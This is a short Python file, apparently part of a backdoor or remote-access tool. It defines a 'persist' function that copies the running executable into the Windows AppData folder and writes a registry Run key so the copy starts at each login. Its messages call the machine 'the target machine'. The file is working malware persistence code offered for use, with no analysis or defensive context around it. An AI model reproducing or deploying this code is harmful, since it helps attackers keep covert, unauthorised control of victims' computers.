import os
import sys
import subprocess
import shutil

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v '+ reg_name + ' /t REG_SZ /d "' + file_location + '"')
            print('\n[+] created persistence reg key: ' + reg_name)

        else:
            print('\n[+] persistence already existed')
    except:
        print('\n[-] Error creating persistence to the target machine')

# persist('security', __file__)